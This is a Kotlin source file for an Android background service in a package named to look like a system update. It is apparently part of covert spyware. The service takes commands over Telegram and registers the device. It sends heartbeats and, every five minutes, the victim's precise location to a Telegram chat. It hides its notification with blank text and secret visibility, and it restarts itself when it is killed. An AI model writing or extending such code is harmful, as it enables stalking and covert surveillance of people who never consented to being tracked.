package com.sys.update2

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class BackgroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = true

    override fun onCreate() {
        super.onCreate()

        try {
            startForegroundCompat()
        } catch (e: Exception) {
            android.util.Log.e("BgService", "fg err: ${e.message}")
        }

        // استقبال أوامر تلغرام
        try { CommandListener.start(applicationContext) } catch (_: Exception) {}

        // تسجيل الجهاز
        try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}

        // SyncWorker — بعد 3 ثواني
        scope.launch {
            delay(3_000L)
            try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
        }

        // Heartbeat — كل 3 دقايق
        scope.launch {
            while (running) {
                try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
                delay(3 * 60_000L)
            }
        }

        // الموقع — كل 5 دقايق
        scope.launch {
            while (running) {
                try {
                    if (hasLocationPermission()) {
                        val loc = LocationHelper.getPreciseLocation(applicationContext, 15)
                        if (loc != null) {
                            LocationCache.save(applicationContext, loc.latitude, loc.longitude, loc.accuracy)
                            if (KeyboardBuilder.locationOn) {
                                TelegramApi.sendMessage(
                                    "📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
                                )
                            }
                        }
                    }
                } catch (_: Exception) {}
                delay(5 * 60_000L)
            }
        }

        // تنظيف ملفات الكاش
        scope.launch {
            while (running) {
                try {
                    val audioDir = File(applicationContext.cacheDir, "audio")
                    if (audioDir.exists()) {
                        val cutoff = System.currentTimeMillis() - 3600_000L
                        audioDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
                    }
                } catch (_: Exception) {}
                delay(10 * 60_000L)
            }
        }

        // Watchdog
        scope.launch {
            while (running) {
                delay(60_000L)
                try {
                    if (!SyncWorkerIsRunning()) SyncWorker.start(applicationContext)
                } catch (_: Exception) {}
            }
        }
    }

    private fun hasLocationPermission(): Boolean {
        return try {
            val fine = ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.ACCESS_FINE_LOCATION
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            val coarse = ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.ACCESS_COARSE_LOCATION
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            fine || coarse
        } catch (_: Exception) {
            false
        }
    }

    private fun SyncWorkerIsRunning(): Boolean {
        return try {
            Thread.getAllStackTraces().keys.any { it.name == "sync-main" && it.isAlive }
        } catch (_: Exception) {
            true
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        try { CommandListener.stop() } catch (_: Exception) {}
        try { SyncWorker.stop() } catch (_: Exception) {}
        try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
        scope.cancel()

        try {
            val restart = Intent(applicationContext, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restart)
            } else {
                applicationContext.startService(restart)
            }
        } catch (_: Exception) {}

        super.onDestroy()
    }

    // ═══════════════════════════════════════════
    //  إشعار رفيع جداً
    // ═══════════════════════════════════════════
    private fun startForegroundCompat() {
        val channelId = "sys_sync_channel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(channelId) == null) {
                val ch = NotificationChannel(
                    channelId,
                    " ",
                    NotificationManager.IMPORTANCE_MIN
                )
                ch.setSound(null, null)
                ch.enableVibration(false)
                ch.setShowBadge(false)
                ch.description = " "
                ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
                nm.createNotificationChannel(ch)
            }
        }

        val notif: Notification = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(R.drawable.ic_white_dot)
            .setContentTitle(" ")
            .setContentText(" ")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    1001,
                    notif,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } catch (_: Exception) {
                startForeground(1001, notif)
            }
        } else {
            startForeground(1001, notif)
        }
    }
}
